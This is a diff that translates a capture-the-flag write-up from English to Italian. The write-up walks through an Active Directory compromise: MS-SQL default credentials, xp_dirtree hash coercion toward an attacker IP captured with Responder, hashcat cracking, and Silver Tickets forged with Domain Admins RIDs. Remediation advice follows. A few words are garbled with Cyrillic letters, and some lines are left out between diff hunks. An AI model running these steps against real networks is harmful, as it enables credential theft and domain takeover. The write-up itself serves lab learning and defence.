@@ -1,50 +1,50 @@
-# "Signed" Scenario – Kerberos Abuse & Active Directory Compromise
+# Scenario "Signed" – Kerberos Abuse & Active Directory Compromise
 
-> **Context:** Simulated assessment on an Active Directory infrastructure compromised starting from an exposed MS-SQL database. The attack demonstrates how a single application vulnerability can cascade into total domain compromise via NTLM credential interception and Kerberos Silver Ticket forging.
+> **Contesto:** Assessment simulato su infrastruttura AD compromessa partendo da MS-SQL database esposto. L'attacco dimostra come una singola vulnerabilità applicativa possa propagarsi verso compromesso totale del dominio tramite NTLM credential interception e Kerberos Silver Ticket forging.
 
-**Assessment Date:** October 2025  
-**Environment:** Windows Server + Active Directory + MS-SQL  
-**Type:** Infrastructure Penetration Testing  
+**Data Assessment:** Ottobre 2025  
+**Ambiente:** Windows Server + Active Directory + MS-SQL  
+**Tipo:** Infrastructure Penetration Testing  
 **Risk:** CRITICAL 🔴  
-**Methodology:** PTES + Kerberos exploitation
+**Metodologia:** PTES + Kerberos exploitation
 
 ---
 
 ## 1. Executive Summary
 
-Starting from an MS-SQL instance exposed on the network with weak credentials, it was possible to completely compromise the AD infrastructure by leveraging a vulnerability chain:
+Partendo da MS-SQL esposto su rete con credenziali weak, è stato possibile compromettere completamente l'infrastruttura AD sfruttando una catena di vulnerabilità:
 
-1. **Database Exposure** – MS-SQL accessible with guest credentials
-2. **NTLM Coercion** – Forced SMB authentication via `xp_dirtree` → hash capture using Responder
-3. **Credential Recovery** – NTLMv2 hash cracked offline, access as `mssqlsvc`
-4. **Kerberos Abuse** – Forging of Silver Ticket via PAC manipulation
-5. **Domain Takeover** – Root access to the file system and leaking of sensitive flags
+1. **Database Exposure** – MS-SQL accessibile con credenziali guest
+2. **NTLM Coercion** – Forced SMB authentication via `xp_dirtree` → hash capture tramite Responder
+3. **Credential Recovery** – Hash NTLMv2 crackato offline, accesso come `mssqlsvc`
+4. **Kerberos Abuse** – Forgiatura di Silver Ticket via PAC manipulation
+5. **Domain Takeover** – Accesso root al file system e leak di flag sensibili
 
-The impact: **Fully compromised domain**, administrative access, file system access.
+L'impatto: **Dominio completamente compromesso**, accesso amministrativo, file system access.
 
 ---
 
 ## 2. Reconnaissance & Initial Access
 
-Starting off with a classic nmap:
+Inizio con nmap classica:
 
 ```bash
 sudo nmap -A --open -v -T4 -Pn 10.129.197.161 -oA Signed
 ```
 
-I notice right away that the only open port is the `ms-sql` one (port 1433). Initial credential testing:
+Noto da subito che l'unica porta aperta è quella di `ms-sql` (porta 1433). Test credenziali iniziali:
 
 ```bash
 impacket-mssqlclient -u scott -p tiger 10.129.197.161
 ```
 
-Perfect, successful connection. Privilege: `guest` user, very limited. I can't run advanced queries, but I have access to something interesting: the `xp_dirtree` stored procedure.
+Perfetto, connessione riuscita. Privilege: utente `guest`, molto limitato. Non posso lancia query avanzate, ma ho accesso ad una cosa interessante: la stored procedure `xp_dirtree`.
 
 ---
 
 ## 3. NTLM Credential Extraction via xp_dirtree
 
-Since I'm `guest`, I can't do squad at the direct escalation level. But I discovered a technique: if I use `xp_dirtree` pointing to a non-existent UNC path towards my IP, the database **attempts to authenticate to it via SMB**. And there, with Responder listening, you capture the service account's hash.
+Dato che sono `guest`, non posso fare una mazza a livello di escalation diretta. Però ho scoperto una tecnica: se uso `xp_dirtree` puntando a un UNC path inesistente verso il mio IP, il database **lo tenta autenticare via SMB**. E lì, con un Responder in listening, catturi l'hash dell'account di servizio.
 
 Setup:
 
@@ -52,32 +52,32 @@ Setup:
 sudo responder -I tun0
 ```
 
-From the database:
+Dal database:
 
 ```sql
 EXEC xp_dirtree '\\10.10.15.35\nonexistent';
 ```
 
-Responder captures:
+Responder cattura:
 
 ```
 [SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
 [SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:1122334455667788:...
 ```
 
-Hash captured. Perfect.
+Hash captured. Perfetto.
 
 ---
 
 ## 4. Hash Cracking & Service Account Compromise
 
-After saving the hash, I crack it with hashcat, mode 5600 (NTLMv2):
+Dopo aver salvato l'hash, lo cracko con hashcat, modo 5600 (NTLMv2):
 
 ```bash
 hashcat -m 5600 mssqlsvc_hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
-And thanks to good luck, the password is crackable. Access as `mssqlsvc`:
+E grazie alla buona sorte, la password è crackabile. Accesso come `mssqlsvc`:
 
 ```bash
 impacket-mssqlclient -u mssqlsvc -p 'EvilPassword123' 10.129.197.161
@@ -89,13 +89,13 @@ Output:
 SQL (SIGNED\mssqlsvc  dbo@master)>
 ```
 
-Now I have `dbo` privileges on the database. But there's an issue: even if I turn on `xp_cmdshell`, I can't access sensitive files. Why? Because the **MS-SQL process** executing the commands doesn't have the OS permissions to read them.
+Ora ho privilegi `dbo` sul database. Ma c'è un problema: anche se accendo `xp_cmdshell`, non riesco ad accedere a file sensibili. Perché? Perché il **processo MS-SQL** che esegue i comandi non ha i permessi OS per leggerli.
 
 ---
 
 ## 5. Domain SID Enumeration
 
-To craft an effective Silver Ticket, I need to extract the Domain SID. Query from the database:
+Per craftare un Silver Ticket efficace devo estrarre il Domain SID. Query dal database:
 
 ```sql
 SELECT name, sid, type, type_desc FROM sys.server_principals;
@@ -110,19 +110,19 @@ SIGNED\Domain Admins   | 0x01050000000000051500000...
 SIGNED\IT              | 0x01050000000000051500000519000C
 ```
 
-Converting the binary SIDs to string format (small Python script):
+Convertendo i binary SID al formato string (piccolo script Python):
 
 ```
 Domain SID: S-1-5-21-4088429403-1159899800-2753317549
 ```
 
-Taking note.
+Prendo nota.
 
 ---
 
 ## 6. First Silver Ticket – Database Admin Access
 
-Now I craft the first Silver Ticket. Goal: impersonate Administrator towards MS-SQL, enable `xp_cmdshell`, and read the user flag.
+Ora crafto il primo Silver Ticket. L'obiettivo: impersonare Administrator verso MS-SQL, abilitare `xp_cmdshell`, e leggere il flag utente.
 
 ```bash
 impacket-ticketer \
@@ -143,14 +143,14 @@ Output:
 [*] Saving ticket in Administrator.ccache
 ```
 
-I assign it as an environment variable and connect:
+Assegno come variabile d'ambiente e connetto:
 
 ```bash
 export KRB5CCNAME=Administrator.ccache
 impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB
 ```
 
-Result:
+Risultato:
 
 ```
 SQL (SIGNED\Administrator  dbo@master)>
@@ -161,15 +161,15 @@ xp_cmdshell 'type C:\Users\scott\Desktop\user.txt'
 HTB{flaghere}
 ```
 
-User flag obtained. But when I try to read `C:\Users\Administrator\Desktop\root.txt`, access denied. Because the MS-SQL process **is not a member of the Domain Admins group at the OS level**.
+User flag ottenuto. Ma quando provo a leggere `C:\Users\Administrator\Desktop\root.txt`, accesso negato. Perché il processo MS-SQL **non è membro del gruppo Domain Admins a livello OS**.
 
 ---
 
 ## 7. PAC Manipulation & Second Silver Ticket
 
-After cursing for a good half hour, I realize: I must craft a second ticket that is NOT Administrator, but rather `mssqlsvc` **with membership to Domain Admins groups in the PAC**.
+Dopo aver bestemmiato per una mezz'ora buona, realizzo: devo craftare un secondo ticket che NON sia Administrator, ma sia `mssqlsvc` **con membership ai gruppi Domain Admins nel PAC**.
 
-The PAC (Privilege Attribute Certificate) is the data structure inside the Kerberos ticket containing group RIDs. If I manually forge it by inserting RIDs 512 (Domain Admins) and 519 (Enterprise Admins), the MS-SQL service trusts it without re-validating with the KDC.
+Il PAC (Privilege Attribute Certificate) è la struttura dati dentro il ticket Kerberos che contiene i RID dei gruppi. Se lo forgio manualmente inserendo i RID 512 (Domain Admins) e 519 (Enterprise Admins), il servizio MS-SQL lo truста senza revalidare col KDC.
 
 ```bash
 impacket-ticketer \
@@ -182,42 +182,42 @@ impacket-ticketer \
   mssqlsvc
 ```
 
-Parameters change: `-groups` now contains Domain Admins RID (512) and `-user-id` is 1103 (custom RID). Assigning the ticket:
+Parametri cambiano: `-groups` ora contiene RID di Domain Admins (512) e `-user-id` è 1103 (RID custom). Assegno il ticket:
 
 ```bash
 export KRB5CCNAME=mssqlsvc_admin.ccache
 impacket-mssqlclient -k -no-pass dc01.signed.htb
 ```
 
-Now I try to read the root flag:
+Ora provo a leggere il root flag:
 
 ```sql
 SQL (SIGNED\mssqlsvc  dbo@master)>
 SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
 ```
 
-Success! Root flag obtained.
+Success! Root flag ottenuto.
 
-The reason why it works: **the forged PAC tells the system that `mssqlsvc` is a member of Domain Admins. The file system check sees the RID 512 in the token and grants access.**
+Il motivo per cui funziona: **il PAC forgiato dice al sistema che `mssqlsvc` è membro di Domain Admins. Il file system check vede il RID 512 nel token e concede accesso.**
 
 ---
 
 ## 8. Why This Works – Technical Breakdown
 
-Kerberos assumes that signed tokens are **trustworthy**. When we have the NT hash of the service account (`mssqlsvc`), we can **forge the token entirely**, circumventing the PAC with arbitrary RIDs.
+Il Kerberos assume che i token firmati siano **trustworthy**. Quando abbiamo l'NT hash dell'account di servizio (`mssqlsvc`), possiamo **forgiare il token completamente**, includendo il PAC con RID arbitrari.
 
-**Differences between the two tickets:**
+**Differenze tra i due ticket:**
 
-| Aspect | First Ticket | Second Ticket |
+| Aspetto | Primo Ticket | Secondo Ticket |
 |--------|-------------|---|
-| **User** | Administrator (ID 500) | mssqlsvc (ID 1103) |
-| **Groups** | [1105] (User) | [512, 519, 1105] (DA, EA, User) |
-| **DB Accessibility** | ✓ `dbo` + `xp_cmdshell` | ✓ `dbo` + `xp_cmdshell` |
-| **OS File Accessibility** | ✗ Process is not DA | ✓ Process inherits DA from PAC |
+| **Utente** | Administrator (ID 500) | mssqlsvc (ID 1103) |
+| **Gruppi** | [1105] (User) | [512, 519, 1105] (DA, EA, User) |
+| **Accessibilità DB** | ✓ `dbo` + `xp_cmdshell` | ✓ `dbo` + `xp_cmdshell` |
+| **Accessibilità File OS** | ✗ Processo non è DA | ✓ Processo eredita DA dal PAC |
 
-In the first ticket, even if **the name says Administrator**, the **MS-SQL process runs as `mssqlsvc`** which is not a DA member.
+Nel primo ticket, anche se **il nome dice Administrator**, il **processo MS-SQL gira come `mssqlsvc`** che non è membro di DA.
 
-In the second ticket, the PAC contains the RID 512 (**Domain Admins**), so even if the name is `mssqlsvc`, the token has the necessary permissions.
+Nel secondo ticket, il PAC contiene il RID 512 (**Domain Admins**), quindi anche se il nome è `mssqlsvc`, il token ha i permessi necessari.
 
 ---
 
@@ -240,34 +240,34 @@ In the second ticket, the PAC contains the RID 512 (**Domain Admins**), so even 
 
 ## 10. Remediation & Prevention
 
-Mitigating this type of attack requires a **multi-layer approach**:
+Mitigare questo tipo di attacco richiede **approccio multi-layer**:
 
 **Immediate fixes:**
-- Disable `xp_dirtree` and `xp_cmdshell` on MS-SQL instances that do not strictly need them
-- Enforce strong/complex passwords on service accounts
-- Disable LLMNR/NBT-NS via GPO (disarms Responder)
+- Disabilitare `xp_dirtree` e `xp_cmdshell` sulle istanze MS-SQL che non li necessitano
+- Enforce strong/complex passwords su service accounts
+- Disabilitare LLMNR/NBT-NS via GPO (disarma Responder)
 
 **Medium-term:**
-- Migrate service accounts to **Group Managed Service Accounts (gMSA)** → passwords auto-rotated every 30 days (infeasible to crack in the required time)
-- Network segmentation: isolated database VLAN, only app servers can connect
+- Migrare service accounts verso **Group Managed Service Accounts (gMSA)** → password auto-rotated ogni 30 giorni (infeasible crackare nel tempo necessario)
+- Network segmentation: database VLAN isolata, solo app servers possono connettersi
 
 **Long-term:**
-- Migrate to Kerberos-only (disable NTLM entirely)
-- Implement Zero-Trust model: conditional access based on device posture
-- Deploy SIEM with detection on `xp_dirtree` execution and Kerberos anomalies
+- Migrate to Kerberos-only (disable NTLM completamente)
+- Implement Zero-Trust model: conditional access basato su device posture
+- Deploy SIEM con detection su `xp_dirtree` execution e anomalie Kerberos
 
 ---
 
 ## 11. Key Insights
 
-This scenario perfectly demonstrates the **classic progression**: a single misconfiguration (exposed DB + allowed xp_dirtree) propagates to full compromise because:
+Questo scenario dimostra il **classic progression**: una singola misconfiguration (DB esposto + xp_dirtree permessa) si propaga verso compromesso completo perché:
 
-1. **Service account bridging** – A service account connects the app layer with the OS layer
-2. **Token trust model** – Kerberos trusts signed tokens with no re-validation
-3. **PAC forgery** – If you control the account signing the tokens, you control the permissions
+1. **Service account bridging** – Un account di servizio è il collegamento tra app layer e OS layer
+2. **Token trust model** – Kerberos truста i token firmati senza revalidazione
+3. **PAC forgery** – Se controlli l'account che firma i token, controlli i permessi
 
-It's not **one** vulnerability, but an **architectural chain** where each layer assumes the previous one is secure, but it isn't.
+Non è **una** vulnerabilità, ma una **catena architetturale** dove ogni layer assume che il precedente sia sicuro, ma non è così.
 
 ---
 
-**Assessment Completed: October 2025**
+**Assessment Completato: Ottobre 2025**
